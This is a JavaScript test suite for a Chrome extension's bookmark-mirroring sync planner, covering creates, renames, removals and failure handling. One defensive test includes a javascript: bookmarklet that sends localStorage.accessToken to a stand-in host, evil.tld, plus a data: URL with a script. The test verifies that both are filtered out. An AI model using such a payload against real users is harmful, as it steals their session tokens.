import test from 'node:test';
import assert from 'node:assert/strict';
import { planSync, applyPlan, ApplyError } from '../lib/mirror.js';

const EMPTY = { folders: {}, nodes: {} };

const desiredOne = [
  {
    widgetId: '7',
    title: 'Design',
    bookmarks: [
      { id: '11', name: 'Figma', url: 'https://figma.com' },
      { id: '12', name: 'Dribbble', url: 'https://dribbble.com' },
    ],
  },
];

/** Actual state that matches desiredOne exactly. */
function actualForDesiredOne() {
  return {
    folders: { 7: { chromeId: 'c-folder', title: 'Design' } },
    nodes: {
      11: { chromeId: 'c-11', title: 'Figma', url: 'https://figma.com', widgetId: '7' },
      12: { chromeId: 'c-12', title: 'Dribbble', url: 'https://dribbble.com', widgetId: '7' },
    },
  };
}

test('empty mirror: folder and bookmarks are created', () => {
  assert.deepEqual(planSync(desiredOne, EMPTY), [
    { op: 'createFolder', widgetId: '7', title: 'Design' },
    { op: 'createBookmark', widgetId: '7', memoId: '11', title: 'Figma', url: 'https://figma.com' },
    { op: 'createBookmark', widgetId: '7', memoId: '12', title: 'Dribbble', url: 'https://dribbble.com' },
  ]);
});

test('nothing changed — no operations', () => {
  // The key invariant: with polling every 15 minutes, unchanged Memo must not
  // produce a single chrome.bookmarks call, otherwise Chrome Sync spreads
  // deletions and creations to all of the user's devices on every tick
  assert.deepEqual(planSync(desiredOne, actualForDesiredOne()), []);
});

test('widget renamed — one folder rename operation', () => {
  const desired = [{ ...desiredOne[0], title: 'Design and graphics' }];
  assert.deepEqual(planSync(desired, actualForDesiredOne()), [
    { op: 'renameFolder', chromeId: 'c-folder', title: 'Design and graphics' },
  ]);
});

test('bookmark renamed — one update operation', () => {
  const desired = [
    { ...desiredOne[0], bookmarks: [
      { id: '11', name: 'Figma Design', url: 'https://figma.com' },
      { id: '12', name: 'Dribbble', url: 'https://dribbble.com' },
    ] },
  ];
  assert.deepEqual(planSync(desired, actualForDesiredOne()), [
    { op: 'updateBookmark', chromeId: 'c-11', memoId: '11', title: 'Figma Design', url: 'https://figma.com' },
  ]);
});

test('bookmark URL changed — one update operation', () => {
  const desired = [
    { ...desiredOne[0], bookmarks: [
      { id: '11', name: 'Figma', url: 'https://figma.com/files' },
      { id: '12', name: 'Dribbble', url: 'https://dribbble.com' },
    ] },
  ];
  assert.deepEqual(planSync(desired, actualForDesiredOne()), [
    { op: 'updateBookmark', chromeId: 'c-11', memoId: '11', title: 'Figma', url: 'https://figma.com/files' },
  ]);
});

test('bookmark deleted in Memo — removed from the mirror', () => {
  const desired = [{ ...desiredOne[0], bookmarks: [desiredOne[0].bookmarks[0]] }];
  assert.deepEqual(planSync(desired, actualForDesiredOne()), [
    { op: 'removeBookmark', chromeId: 'c-12', memoId: '12' },
  ]);
});

test('widget deselected — its folder is removed', () => {
  assert.deepEqual(planSync([], actualForDesiredOne()), [
    { op: 'removeBookmark', chromeId: 'c-11', memoId: '11' },
    { op: 'removeBookmark', chromeId: 'c-12', memoId: '12' },
    { op: 'removeFolder', chromeId: 'c-folder', widgetId: '7', title: 'Design' },
  ]);
});

test('bookmark moved to another widget — removed from the old place, created in the new one', () => {
  const desired = [
    { widgetId: '7', title: 'Design', bookmarks: [{ id: '11', name: 'Figma', url: 'https://figma.com' }] },
    { widgetId: '8', title: 'Docs', bookmarks: [{ id: '12', name: 'Dribbble', url: 'https://dribbble.com' }] },
  ];
  assert.deepEqual(planSync(desired, actualForDesiredOne()), [
    { op: 'removeBookmark', chromeId: 'c-12', memoId: '12' },
    { op: 'createFolder', widgetId: '8', title: 'Docs' },
    { op: 'createBookmark', widgetId: '8', memoId: '12', title: 'Dribbble', url: 'https://dribbble.com' },
  ]);
});

test('node vanished from the tree — bookmark is recreated', () => {
  // The user deleted a bookmark inside the mirror by hand. The orchestrator
  // purged the key from the map before the call, and the diff must restore it
  const actual = actualForDesiredOne();
  delete actual.nodes[11];
  assert.deepEqual(planSync(desiredOne, actual), [
    { op: 'createBookmark', widgetId: '7', memoId: '11', title: 'Figma', url: 'https://figma.com' },
  ]);
});

test('folder vanished from the tree — recreated along with its contents', () => {
  const actual = { folders: {}, nodes: {} };
  assert.deepEqual(planSync(desiredOne, actual), [
    { op: 'createFolder', widgetId: '7', title: 'Design' },
    { op: 'createBookmark', widgetId: '7', memoId: '11', title: 'Figma', url: 'https://figma.com' },
    { op: 'createBookmark', widgetId: '7', memoId: '12', title: 'Dribbble', url: 'https://dribbble.com' },
  ]);
});

test('removals come before creations, a folder before its bookmarks', () => {
  const desired = [
    { widgetId: '8', title: 'Docs', bookmarks: [{ id: '20', name: 'Notion', url: 'https://notion.so' }] },
  ];
  const plan = planSync(desired, actualForDesiredOne());
  const kinds = plan.map((operation) => operation.op);
  assert.deepEqual(kinds, [
    'removeBookmark', 'removeBookmark', 'removeFolder', 'createFolder', 'createBookmark',
  ]);
});

test('empty input does not break the planner', () => {
  assert.deepEqual(planSync([], EMPTY), []);
  assert.deepEqual(planSync(undefined, undefined), []);
  assert.deepEqual(planSync(desiredOne, undefined).length, 3);
});

test('a widget without bookmarks yields only a folder', () => {
  assert.deepEqual(planSync([{ widgetId: '9', title: 'Empty', bookmarks: [] }], EMPTY), [
    { op: 'createFolder', widgetId: '9', title: 'Empty' },
  ]);
});

/** Fake chrome.bookmarks: hands out predictable ids and logs calls. */
function fakeBookmarks({ failOn = null, refuseRemove = [] } = {}) {
  let counter = 0;
  const calls = [];
  return {
    calls,
    async create(node) {
      calls.push(['create', node]);
      if (failOn === 'create') throw new Error('create failed');
      counter += 1;
      return { id: `new-${counter}` };
    },
    async update(id, changes) {
      calls.push(['update', id, changes]);
      if (failOn === 'update') throw new Error('update failed');
    },
    async remove(id) {
      calls.push(['remove', id]);
      if (failOn === 'remove') throw new Error('remove failed');
      // Chrome refuses to remove a non-empty folder — this is what protects
      // foreign bookmarks inside a widget folder
      if (refuseRemove.includes(id)) throw new Error("Can't remove non-empty folder");
    },
    async removeTree(id) {
      calls.push(['removeTree', id]);
    },
  };
}

test('createBookmark lands in the folder created by the same plan', async () => {
  const api = fakeBookmarks();
  const plan = planSync(desiredOne, EMPTY);
  const state = await applyPlan(api, plan, { rootId: 'root', folders: {}, nodes: {} });

  assert.deepEqual(api.calls[0], ['create', { parentId: 'root', title: 'Design' }]);
  assert.deepEqual(api.calls[1], [
    'create',
    { parentId: 'new-1', title: 'Figma', url: 'https://figma.com' },
  ]);
  assert.equal(state.folders['7'].chromeId, 'new-1');
  assert.equal(state.nodes['11'].chromeId, 'new-2');
  assert.equal(state.nodes['11'].widgetId, '7');
});

test('removing a folder also drops its bookmarks from the map', async () => {
  const api = fakeBookmarks();
  const plan = planSync([], actualForDesiredOne());
  const state = await applyPlan(api, plan, {
    rootId: 'root',
    ...actualForDesiredOne(),
  });

  assert.deepEqual(state.folders, {});
  assert.deepEqual(state.nodes, {});
  // remove, not removeTree: removeTree would also wipe foreign bookmarks
  // along with the folder
  assert.ok(api.calls.some((call) => call[0] === 'remove' && call[1] === 'c-folder'));
  assert.ok(!api.calls.some((call) => call[0] === 'removeTree'));
});

test('renaming a folder updates the title in the map', async () => {
  const api = fakeBookmarks();
  const plan = [{ op: 'renameFolder', chromeId: 'c-folder', title: 'New name' }];
  const state = await applyPlan(api, plan, { rootId: 'root', ...actualForDesiredOne() });

  assert.equal(state.folders['7'].title, 'New name');
  assert.equal(state.folders['7'].chromeId, 'c-folder');
});

test('updating a bookmark updates the map', async () => {
  const api = fakeBookmarks();
  const plan = [
    { op: 'updateBookmark', chromeId: 'c-11', memoId: '11', title: 'Figma X', url: 'https://f.io' },
  ];
  const state = await applyPlan(api, plan, { rootId: 'root', ...actualForDesiredOne() });

  assert.deepEqual(state.nodes['11'], {
    chromeId: 'c-11',
    title: 'Figma X',
    url: 'https://f.io',
    widgetId: '7',
  });
});

test('a failed operation returns the maps as of the failure, not losing them', async () => {
  // The map must reflect what actually happened in the tree: otherwise the
  // next sync won't find the created folder and will create a second one
  const api = fakeBookmarks({ failOn: 'update' });
  const plan = [
    { op: 'createFolder', widgetId: '7', title: 'Design' },
    { op: 'updateBookmark', chromeId: 'c-11', memoId: '11', title: 'X', url: 'https://x.io' },
  ];

  await assert.rejects(
    () => applyPlan(api, plan, { rootId: 'root', folders: {}, nodes: {} }),
    (error) => {
      assert.ok(error instanceof ApplyError);
      assert.equal(error.state.folders['7'].chromeId, 'new-1');
      return true;
    },
  );
});

test('a bookmark without a created folder is not created', async () => {
  // Guards against a plan where createFolder did not run: a parentless
  // bookmark would end up in the toolbar root, among the user's own bookmarks
  const api = fakeBookmarks();
  const plan = [
    { op: 'createBookmark', widgetId: '99', memoId: '5', title: 'A', url: 'https://a.io' },
  ];
  const state = await applyPlan(api, plan, { rootId: 'root', folders: {}, nodes: {} });

  assert.deepEqual(api.calls, []);
  assert.deepEqual(state.nodes, {});
});

test('an empty plan leaves the tree untouched', async () => {
  const api = fakeBookmarks();
  const before = actualForDesiredOne();
  const state = await applyPlan(api, [], { rootId: 'root', ...before });

  assert.deepEqual(api.calls, []);
  assert.deepEqual(state, { folders: before.folders, nodes: before.nodes, kept: [] });
});


test('a folder with a foreign bookmark inside is not removed, just disowned', async () => {
  // The user dragged a personal bookmark into a widget folder and unchecked
  // the widget. The personal bookmark must survive: it is not in the maps,
  // so it does not belong to the mirror
  const api = fakeBookmarks({ refuseRemove: ['c-folder'] });
  const plan = planSync([], actualForDesiredOne());
  const state = await applyPlan(api, plan, { rootId: 'root', ...actualForDesiredOne() });

  assert.ok(!api.calls.some((call) => call[0] === 'removeTree'));
  assert.deepEqual(state.folders, {}, 'folder is no longer tracked, so we do not retry removing it forever');
  assert.deepEqual(state.kept, ['Design'], 'the user must be told about the folder that was not removed');
});

test('a bookmark with a disallowed scheme never gets created', async () => {
  // chrome.bookmarks.create accepts javascript: — these are regular
  // bookmarklets — and clicking one runs the script in the active tab's
  // context. Data comes from the server, and not only the owner can write
  // to a widget
  const desired = [
    {
      widgetId: '7',
      title: 'Design',
      bookmarks: [
        { id: '90', name: 'Reports', url: "javascript:fetch('https://evil.tld/?t='+localStorage.accessToken)" },
        { id: '91', name: 'data', url: 'data:text/html,<script>alert(1)</script>' },
        { id: '92', name: 'Live', url: 'https://example.com' },
      ],
    },
  ];
  const plan = planSync(desired, EMPTY);
  assert.deepEqual(plan, [
    { op: 'createFolder', widgetId: '7', title: 'Design' },
    { op: 'createBookmark', widgetId: '7', memoId: '92', title: 'Live', url: 'https://example.com' },
  ]);

  const api = fakeBookmarks();
  await applyPlan(api, plan, { rootId: 'root', folders: {}, nodes: {} });
  const created = api.calls.filter((call) => call[0] === 'create').map((call) => call[1].url);
  assert.deepEqual(created, [undefined, 'https://example.com']);
});

test('an already created bookmark with a disallowed scheme is removed from the mirror', () => {
  // The mirror may have been built by a version without the filter — it must
  // clean itself up
  const actual = {
    folders: { 7: { chromeId: 'c-folder', title: 'Design' } },
    nodes: {
      90: { chromeId: 'c-90', title: 'Reports', url: 'javascript:alert(1)', widgetId: '7' },
    },
  };
  const desired = [
    { widgetId: '7', title: 'Design', bookmarks: [{ id: '90', name: 'Reports', url: 'javascript:alert(1)' }] },
  ];
  assert.deepEqual(planSync(desired, actual), [
    { op: 'removeBookmark', chromeId: 'c-90', memoId: '90' },
  ]);
});

test('maps are reported out after every operation', async () => {
  // MV3 unloads the worker not only on exceptions. If that happens mid-plan,
  // already created nodes must be recorded, otherwise the next pass will
  // create duplicates next to them
  const api = fakeBookmarks();
  const plan = planSync(desiredOne, EMPTY);
  const snapshots = [];
  await applyPlan(api, plan, { rootId: 'root', folders: {}, nodes: {} }, (state) => {
    snapshots.push({ folders: Object.keys(state.folders), nodes: Object.keys(state.nodes) });
  });

  assert.equal(snapshots.length, plan.length);
  assert.deepEqual(snapshots[0], { folders: ['7'], nodes: [] });
  assert.deepEqual(snapshots[2], { folders: ['7'], nodes: ['11', '12'] });
});
